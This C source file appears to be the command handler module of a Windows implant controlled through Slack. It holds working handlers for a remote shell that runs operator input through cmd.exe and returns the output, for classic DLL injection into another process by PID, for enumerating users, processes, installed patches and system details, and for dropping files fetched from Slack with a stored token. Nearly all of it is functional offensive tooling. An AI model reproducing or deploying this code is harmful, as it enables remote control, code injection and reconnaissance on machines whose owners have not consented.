#include "Header.h"


void shell(SlackCmd* slackCmd) {
    printf("[*] Entered shell() function\n");

    if (!slackCmd || !slackCmd->buffer || slackCmd->bufferSize < 7) {
        printf("[!] Invalid SlackCmd or malformed buffer.\n");
        return;
    }

    printf("[*] Original buffer: '%s'\n", slackCmd->buffer);

    // Step 1: Safely extract command part (skip "shell ")
    const char* commandStart = slackCmd->buffer + 6;
    char userCommand[1024] = { 0 };
    errno_t err = strncpy_s(userCommand, sizeof(userCommand), commandStart, _TRUNCATE);
    if (err != 0) {
        printf("[!] Failed to copy user command safely (strncpy_s): %d\n", err);
        return;
    }

    printf("[*] Extracted user command: '%s'\n", userCommand);

    // Step 2: Wipe and free the old buffer (used to store input)
    if (slackCmd->buffer) {
        printf("[*] Freeing old SlackCmd->buffer memory\n");
        SecureZeroMemory(slackCmd->buffer, slackCmd->bufferSize);
        VirtualFree(slackCmd->buffer, 0, MEM_RELEASE);
        slackCmd->buffer = NULL;
        slackCmd->bufferSize = 0;
    }

    // Step 3: Build full command string safely: "cmd.exe /c <userCommand>"
    char fullCommand[1024] = { 0 };
    err = sprintf_s(fullCommand, sizeof(fullCommand), "cmd.exe /c %s", userCommand);
    if (err < 0) {
        printf("[!] Failed to build full command string (sprintf_s)\n");
        return;
    }

    printf("[*] Full command to execute: '%s'\n", fullCommand);

    // Step 4: Execute command and capture output
    FILE* pipe = _popen(fullCommand, "r");
    if (!pipe) {
        perror("[!] _popen failed");
        return;
    }

    char outputLine[512] = { 0 };
    while (fgets(outputLine, sizeof(outputLine), pipe)) {
        printf("[>] %s", outputLine); // already includes newline
        BufferAppend(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "%s", outputLine);
        printf("[*] Appended to buffer. New size: %d\n", slackCmd->bufferSize);
    }

    _pclose(pipe);
    printf("[*] Exiting shell() cleanly\n");
}

void cd(SlackCmd* slackCmd) {

    // Validate parameter
    if (!slackCmd) DEBUG("Invalid slackCmd");

    // Parse the new working directory from input
    char* newDir = ParseFirstArg(slackCmd->buffer);
    if (!newDir) DEBUG("ParseFirstArg returned NULL");

    // Free old working directory if necessary
    if (gConfig.currentWorkingDir) {
        SecureZeroMemory(gConfig.currentWorkingDir, strlen(gConfig.currentWorkingDir));
        VirtualFree(gConfig.currentWorkingDir, 0, MEM_RELEASE);
        gConfig.currentWorkingDir = NULL;
    }

    // Allocate new memory and copy the new directory
    size_t len = strlen(newDir);
    gConfig.currentWorkingDir = (char*)VirtualAlloc(NULL, len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!gConfig.currentWorkingDir) {
        DEBUG("VirtualAlloc for currentWorkingDir failed");
    }

    strcpy_s(gConfig.currentWorkingDir, len + 1, newDir);

    // Reassign slackCmd->buffer and bufferSize
    BufferReplace(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "Changed Directory: %s\n", gConfig.currentWorkingDir);



_ERROR:
    return;
}

void classicdllinject(SlackCmd* slackCmd) {

    // Parse out the first argument
    char* dllPath = ParseFirstArg(slackCmd->buffer);

    // Parse out the second argument
    DWORD pid = atoi(ParseSecondArg(slackCmd->buffer));


    HANDLE	hThread = NULL;								// Handle to created thread
    HANDLE  hProcess = NULL;                            // Handle to the target process
    SIZE_T	lpNumberOfBytesWritten = NULL;				// A buffer to record the number of sucessfully written bytes
    VOID* pLoadLibraryA = NULL;							// Pointer to the LoadLibraryW function
    DWORD	dwDLLNameSize = strlen(dllPath) + 1;	    // Size of the DLL name in bytes
    VOID* pMemAddr = NULL;								// Pointer to allocated memory in the remote process


    // 1. Open a handle to a process given the PID
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, NULL, pid);
    if (!hProcess) DEBUG("OpenProcess");


    // 2. Find LoadLibraryW Address
    //    We need to obtain the address of LoadLibraryW from Kernel32.dll
    //    This will be used as the entry when a new thread is created in the remote process
    pLoadLibraryA = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibraryA) DEBUG("GetProcAddress");
    printf("[i] LoadLibraryW located at : 0x%p\n", pLoadLibraryA);


    // 3. Allocate enough memory to fit the DLL's name
    pMemAddr = VirtualAllocEx(hProcess, NULL, dwDLLNameSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMemAddr) DEBUG("VirtualAllocEx");
    printf("[i] pAddress Allocated at : 0x%p Of Size : %d\n", pMemAddr, dwDLLNameSize);


    // 3. Write to the allocated memory
    if (!WriteProcessMemory(
        hProcess,					  // A handle to the process we inject to
        pMemAddr,					  // Base address in the specific process where data is written
        dllPath,					  // A pointer to the buffer that contains data to be written to pMemAddr
        (SIZE_T)dwDLLNameSize,		  // Number of bytes to be written to the specified process
        &lpNumberOfBytesWritten)) {   // A pointer to a 'SIZE_T' variable that receives the number of bytes actually written {
        DEBUG("WriteProcessMemory");
    }
    printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);

    // 4. Execution via New Thread
    // In this case, we are executing "LoadLibraryW" in explorer.exe to load Dll1.dll
    hThread = CreateRemoteThread(
        hProcess,       // Handle to process we inject into
        NULL,           //
        NULL,           // 
        pLoadLibraryA,  // What the thread should begin to execute
        pMemAddr,       // Parameters to the executed program (Points to DLL name)
        NULL,           //
        NULL);          //
    if (!hThread) DEBUG("CreateRemoteThread");
    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    printf("[i] Thread exit code: 0x%08X\n", exitCode);


    printf("Injected %s into PID: %d\n", dllPath, pid);
    BufferReplace(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "Injected %s into PID: %d\n", dllPath, pid);


    // Cleanup
    if (hThread)
        CloseHandle(hThread);
    if (hProcess)
        CloseHandle(hProcess);


_ERROR:
    // Cleanup
    if (hThread)
        CloseHandle(hThread);
    if (hProcess)
        CloseHandle(hProcess);
    return;

}

void ls(SlackCmd* slackCmd) {

    // Validate parameter
    if (!slackCmd) DEBUG("Invalid Param");

    // Initialize Vars
    WIN32_FIND_DATAA pfindData = { 0 };
    HANDLE hFileHandle = INVALID_HANDLE_VALUE;
    char* input = ParseFirstArg(slackCmd->buffer);
    char* directory = NULL;
    ULONGLONG objectSize = 0;


    // Use current working directory if none supplied
    if (!input || strlen(input) == 0) {
        directory = _strdup(gConfig.currentWorkingDir);
    }
    else {

        // If relative path (e.g., Desktop), prepend cwd
        if (!(isalpha(input[0]) && input[1] == ':' || input[0] == '\\')) {
            size_t cwdLen = strlen(gConfig.currentWorkingDir);
            size_t inputLen = strlen(input);
            size_t totalLen = cwdLen + inputLen + 2;

            directory = (char*)VirtualAlloc(NULL, totalLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!directory) DEBUG("VirtualAlloc failed");

            snprintf(directory, totalLen, "%s\\%s", gConfig.currentWorkingDir, input);
        }
        else {
            // Already an absolute path
            directory = _strdup(input);
        }
    }

    // Ensure it ends with a single backslash before appending *
    int len = strlen(directory);
    if (len > 0 && directory[len - 1] != '\\') {
        BufferAppend(&directory, len, &len, "%s", "\\*");
    }
    else {
        BufferAppend(&directory, len, &len, "%s", "*");
    }

    // Wipe the buffer before we append to it
    if (slackCmd->buffer) {
        SecureZeroMemory(slackCmd->buffer, slackCmd->bufferSize);
        VirtualFree(slackCmd->buffer, 0, MEM_RELEASE);
        slackCmd->buffer = NULL;
        slackCmd->bufferSize = 0;
    }

    // Grab the first object
    hFileHandle = FindFirstFileA(directory, &pfindData);
    if (!hFileHandle) {
        DEBUG("FindFirstFileA");
    }


    do {

        // Get filesize
        objectSize = ((ULONGLONG)pfindData.nFileSizeHigh << 32) | pfindData.nFileSizeLow;

        // Get creation time
        char creationTime[20] = { 0 };
        FormatFileTime(&pfindData.ftCreationTime, creationTime, sizeof(creationTime));

        // Get the name (If long, use alternate)
        const char* name = (strlen(pfindData.cFileName) < 25) ? pfindData.cFileName : pfindData.cAlternateFileName;

        // Skip "." and ".." entries
        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0)
            continue;

        // If it's a directory, preface with <DIR> 
        if (pfindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            BufferAppend(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "%s  <DIR>  %-25s\n", creationTime, name);
        }
        // If it's a file, print as normal
        else {
            double size = (double)objectSize;
            const char* unit = "B";

            if (size >= (1024.0 * 1024.0 * 1024.0)) {
                size /= (1024.0 * 1024.0 * 1024.0);
                unit = "GB";
            }
            else if (size >= (1024.0 * 1024.0)) {
                size /= (1024.0 * 1024.0);
                unit = "MB";
            }
            else if (size >= 1024.0) {
                size /= 1024.0;
                unit = "KB";
            }

            BufferAppend(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "%s         %-25s %8.2f %3s\n", creationTime, name, size, unit);
        }

    } while (FindNextFileA(hFileHandle, &pfindData));


    FindClose(hFileHandle);
    return;

_ERROR:
    exit(-1);

}

void netusers(SlackCmd* slackCmd) {


    // Initialize
    USER_INFO_0* userInfoStructs = NULL;
    DWORD numEntriesRead = 0;
    DWORD numTotalEntries = 0;
    DWORD status;

    // Validate parameter
    if (!slackCmd) DEBUG("Invalid Param");

    // Wipe the buffer before we append to it
    if (slackCmd->buffer) {
        SecureZeroMemory(slackCmd->buffer, slackCmd->bufferSize);
        VirtualFree(slackCmd->buffer, 0, MEM_RELEASE);
        slackCmd->buffer = NULL;
        slackCmd->bufferSize = 0;
    }

    // Grab the data (0 --> Array of USER_INFO_0 structs)
    status = NetUserEnum(NULL, 0, 0, (VOID*)&userInfoStructs, MAX_PREFERRED_LENGTH, &numEntriesRead, &numTotalEntries, NULL);
    if (status != NERR_Success) DEBUG("NetUserEnum");


    // Loop through
    for (int i = 0; i < numEntriesRead; i++) {

        //Get widename
        BYTE* wideName = userInfoStructs[i].usri0_name;

        // Length in bytes for WideStringToUTF8 (not including null terminator)
        USHORT lengthInBytes = (USHORT)(wcslen(wideName) * sizeof(WCHAR));

        // Convert wide string to UTF-8
        char* nameUTF8 = WideStringToUTF8(wideName, lengthInBytes);

        if (nameUTF8) {
            BufferAppend(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "%s\n", nameUTF8);
        }

        // Free buffer created from WideStringToUTF8
        free(nameUTF8);

    }

    if (userInfoStructs) {
        NetApiBufferFree(userInfoStructs);
    }


_ERROR:
    return;
}

void ps(SlackCmd* slackCmd) {
    NtQuerySystemInformationFuncPtr pNtQuerySystemInformation = NULL;
    ULONG sizeNeeded = 0;
    SYSTEM_PROCESS_INFORMATION* pProcessData = NULL;
    ULONG bytesWritten = 0;
    NTSTATUS status = 0;
    char* outputBuffer = NULL;
    size_t totalLen = 0;
    SYSTEM_PROCESS_INFORMATION* pCurrentProcessData = NULL;
    char* processName = NULL;
    int written = 0;
    size_t newSize = 0;
    char* newBuffer = NULL;

    if (!slackCmd) {
        DEBUG("Invalid slackCmd pointer");
        return;
    }

    if (slackCmd->buffer) {
        SecureZeroMemory(slackCmd->buffer, slackCmd->bufferSize);
        VirtualFree(slackCmd->buffer, 0, MEM_RELEASE);
        slackCmd->buffer = NULL;
        slackCmd->bufferSize = 0;
    }

    pNtQuerySystemInformation = (NtQuerySystemInformationFuncPtr)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!pNtQuerySystemInformation) {
        DEBUG("GetProcAddress");
        return;
    }

    pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &sizeNeeded);

    pProcessData = (SYSTEM_PROCESS_INFORMATION*)VirtualAlloc(NULL, sizeNeeded, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pProcessData) {
        DEBUG("VirtualAlloc for pProcessData");
        return;
    }
    status = pNtQuerySystemInformation(SystemProcessInformation, pProcessData, sizeNeeded, &bytesWritten);
    if (status < 0) {
        DEBUG("NtQuerySystemInformation failed");
        VirtualFree(pProcessData, 0, MEM_RELEASE);
        return;
    }

    pCurrentProcessData = pProcessData;

   do {

        // Clean the process name
        if (processName) {
            VirtualFree(processName, 0, MEM_RELEASE);
            processName = NULL;
        }

        // Get the process name 
        if (pCurrentProcessData->ImageName.Buffer && pCurrentProcessData->ImageName.Length > 0) {
            processName = WideStringToUTF8(pCurrentProcessData->ImageName.Buffer, pCurrentProcessData->ImageName.Length);
            if (!processName) {
                DEBUG("WideStringToUTF8 failed");
            }

            // Append process info to output buffer
            printf("[+] Process: %-40s PID: %lu\n", processName, (DWORD)(ULONG_PTR)pCurrentProcessData->UniqueProcessId);
            BufferAppend(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "[+] Process: %-40s PID: %lu\n", processName, (DWORD)(ULONG_PTR)pCurrentProcessData->UniqueProcessId);

            if (pCurrentProcessData->NextEntryOffset == 0)
                break;
        }

        
        pCurrentProcessData = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)pCurrentProcessData + pCurrentProcessData->NextEntryOffset);
    
   } while (TRUE);

    
    VirtualFree(processName, 0, MEM_RELEASE);
    VirtualFree(pProcessData, 0, MEM_RELEASE);

    return;

_ERROR:
    if (processName) VirtualFree(processName, 0, MEM_RELEASE);
    if (outputBuffer) VirtualFree(outputBuffer, 0, MEM_RELEASE);
    if (pProcessData) VirtualFree(pProcessData, 0, MEM_RELEASE);
    slackCmd->buffer = NULL;
    slackCmd->bufferSize = 0;
    return;
}

void pwd(SlackCmd* slackCmd) {

    // Validate parameter
    if (!slackCmd) DEBUG("Invalid Param");

    // Replace the buffer
    BufferReplace(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "Current Directory: %s", gConfig.currentWorkingDir);


_ERROR:
    return;

}

void querypatches(SlackCmd* slackCmd) {
    if (!slackCmd) return;


    // Wipe the buffer
    if (slackCmd->buffer) {
        SecureZeroMemory(slackCmd->buffer, slackCmd->bufferSize);
        VirtualFree(slackCmd->buffer, 0, MEM_RELEASE);
        slackCmd->buffer = NULL;
        slackCmd->bufferSize = 0;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return;

    IUpdateSession* pSession = NULL;
    IUpdateSearcher* pSearcher = NULL;
    ISearchResult* pResult = NULL;
    IUpdateCollection* pUpdates = NULL;

    hr = CoCreateInstance(&CLSID_UpdateSession, NULL, CLSCTX_INPROC_SERVER, &IID_IUpdateSession, (void**)&pSession);
    if (FAILED(hr) || !pSession) goto CLEANUP;

    hr = pSession->lpVtbl->CreateUpdateSearcher(pSession, &pSearcher);
    if (FAILED(hr) || !pSearcher) goto CLEANUP;

    BSTR criteria = SysAllocString(L"IsInstalled=1");
    if (!criteria) goto CLEANUP;

    hr = pSearcher->lpVtbl->Search(pSearcher, criteria, &pResult);
    SysFreeString(criteria);
    if (FAILED(hr) || !pResult) goto CLEANUP;

    hr = pResult->lpVtbl->get_Updates(pResult, &pUpdates);
    if (FAILED(hr) || !pUpdates) goto CLEANUP;

    LONG count = 0;
    pUpdates->lpVtbl->get_Count(pUpdates, &count);

    // Estimate buffer size and allocate
    DWORD estimateSize = max(4096, count * 256);
    slackCmd->buffer = (unsigned char*)VirtualAlloc(NULL, estimateSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!slackCmd->buffer) goto CLEANUP;

    char* out = (char*)slackCmd->buffer;
    DWORD offset = 0;

    for (LONG i = 0; i < count; i++) {
        IUpdate* pUpdate = NULL;
        hr = pUpdates->lpVtbl->get_Item(pUpdates, i, &pUpdate);
        if (SUCCEEDED(hr) && pUpdate) {
            BSTR title = NULL;
            if (SUCCEEDED(pUpdate->lpVtbl->get_Title(pUpdate, &title)) && title) {
                int len = WideCharToMultiByte(CP_UTF8, 0, title, -1, NULL, 0, NULL, NULL);
                if ((offset + len + 2) < estimateSize) {
                    WideCharToMultiByte(CP_UTF8, 0, title, -1, out + offset, len, NULL, NULL);
                    offset += len - 1;
                    out[offset++] = '\r';
                    out[offset++] = '\n';
                    out[offset] = '\0';
                }
                SysFreeString(title);
            }
            pUpdate->lpVtbl->Release(pUpdate);
        }
    }

    slackCmd->bufferSize = offset;

CLEANUP:
    if (pUpdates) pUpdates->lpVtbl->Release(pUpdates);
    if (pResult) pResult->lpVtbl->Release(pResult);
    if (pSearcher) pSearcher->lpVtbl->Release(pSearcher);
    if (pSession) pSession->lpVtbl->Release(pSession);
    CoUninitialize();
}

void systeminfo(SlackCmd* slackCmd) {
    
    // Create a variable of type SYSTEM_INFO
    SYSTEM_INFO systemInfo;

    // Use KUSER_SHARED_DATA to find major, minor, and build info
    // https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi_x/kuser_shared_data/index.htm
    BYTE* pKUSER_SHARED_DATA = (BYTE*)0x7ffe0000;

    // Use the GetNativeSystemInfo API
    GetNativeSystemInfo(&systemInfo);

    // Reassign slackCmd->buffer, slackCmd->bufferSize
    BufferReplace(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, 
        "Processors: %d\n"
        "Page size: %d\n"
        "Processor type: %d\n"
        "Version: %d.%d. Build: %d\n",
        systemInfo.dwNumberOfProcessors,
        systemInfo.dwPageSize,
        systemInfo.dwProcessorType,
        *(PULONG)(pKUSER_SHARED_DATA + NT_MAJOR_VERSION),
        *(PULONG)(pKUSER_SHARED_DATA + NT_MINOR_VERSION),
        *(PULONG)(pKUSER_SHARED_DATA + 0x260));

}

void unknown(SlackCmd* slackCmd) {

    // Reassign slackCmd->buffer, slackCmd->bufferSize
    BufferReplace(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "Unknown Command");

}

void upload(SlackCmd* slackCmd) {


    const char* bearerToken = gConfig.userToken; 


    // Writes data to slackCmd->buffer
    printf("[*] Downloading file from: %s\n", slackCmd->url_private);

    // What if we just made a more agnostic "GetFromSlack" that takes in (char** data, char* url)
    if (!UploadFile(slackCmd)) {
        printf("[-] File download failed.\n");
    }


    const char* filename = slackCmd->name;

    // Verify gConfig.currentWorkingDir is null-terminated
    if (!gConfig.currentWorkingDir || gConfig.currentWorkingDir[0] == '\0') {
        printf("[-] currentWorkingDir is empty or null.\n");
        return FALSE;
    }

    SIZE_T pathLen = strlen(gConfig.currentWorkingDir);
    SIZE_T fileLen = strlen(filename);

    // Make sure gConfig.currentWorkingDir doesn't already end with a backslash
    BOOL endsWithSlash = gConfig.currentWorkingDir[pathLen - 1] == '\\' || gConfig.currentWorkingDir[pathLen - 1] == '/';

    // Allocate enough space for: path + optional slash + filename + null terminator
    SIZE_T fullLen = pathLen + (endsWithSlash ? 0 : 1) + fileLen + 1;

    char* fullPath = (char*)VirtualAlloc(NULL, fullLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fullPath) {
        printf("[-] VirtualAlloc failed\n");
        return FALSE;
    }

    // Construct full path
    if (_snprintf_s(fullPath, fullLen, _TRUNCATE, endsWithSlash ? "%s%s" : "%s\\%s", gConfig.currentWorkingDir, filename) == -1) {
        printf("[-] Failed to format full path\n");
        VirtualFree(fullPath, 0, MEM_RELEASE);
        return FALSE;
    }

    // File creation
    HANDLE hFile = CreateFileA(fullPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file: %s\n", fullPath);
        VirtualFree(fullPath, 0, MEM_RELEASE);
        return FALSE;
    }

    // Write to hFile with data
    int bytesWritten = 0;
    WriteFile(hFile, slackCmd->buffer, slackCmd->bufferSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    slackCmd->bufferSize = bytesWritten;
    return;

}

void username(SlackCmd* slackCmd) {
    
    // Initialize variables
    LPSTR userName = NULL;
    DWORD size = 0;
    EXTENDED_NAME_FORMAT format = NameSamCompatible;

    // Validate parameter
    if (!slackCmd) DEBUG("Invalid Param");
  
    // Get the size, fails intentionally
    GetUserNameExA(format, NULL, &size);

    // Allocate enough memory to hold all data
    userName = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!userName)  DEBUG("VirtualAlloc");

    // Write username into temporary buffer
    if (!GetUserNameExA(format, userName, &size)) DEBUG("GetUserNameExA");

    // Write to return buffer
    BufferReplace(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "%s", userName);
    
    // Release the original buffer
    VirtualFree(userName, 0, MEM_RELEASE);


_ERROR:
    if(userName) VirtualFree(userName, 0, MEM_RELEASE);
    return;

}

void sha256(SlackCmd* slackCmd) {
    if (!slackCmd) {
        DEBUG("Invalid Param");
        return;
    }

    char* input = ParseFirstArg(slackCmd->buffer);
    if (!input || strlen(input) == 0) {
        DEBUG("No file path provided");
        return;
    }

    DWORD attr = GetFileAttributesA(input);
    if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        DEBUG("File does not exist or is a directory");
        return;
    }

    HANDLE hInput = CreateFileA(input, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInput == INVALID_HANDLE_VALUE) {
        DEBUG("Failed to open file");
        return;
    }

    DWORD fileSize = GetFileSize(hInput, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hInput);
        DEBUG("Invalid or empty file");
        return;
    }

    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hInput);
        DEBUG("VirtualAlloc failed");
        return;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hInput, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hInput);
        VirtualFree(buffer, 0, MEM_RELEASE);
        DEBUG("Failed to read file");
        return;
    }
    CloseHandle(hInput);

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE hash[32] = { 0 }; // SHA-256 = 32 bytes
    DWORD hashLen = sizeof(hash);

    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) goto cleanup;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    if (!CryptHashData(hHash, buffer, fileSize, 0)) goto cleanup;
    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) goto cleanup;

    char hexHash[65] = { 0 };  // 64 hex chars + null terminator
    for (DWORD i = 0; i < hashLen; i++) {
        sprintf_s(hexHash + i * 2, 3, "%02x", hash[i]);
    }
    BufferReplace(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, "SHA-256: %s", hexHash);


cleanup:
    if (buffer) VirtualFree(buffer, 0, MEM_RELEASE);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);

_ERROR:
    return;
}

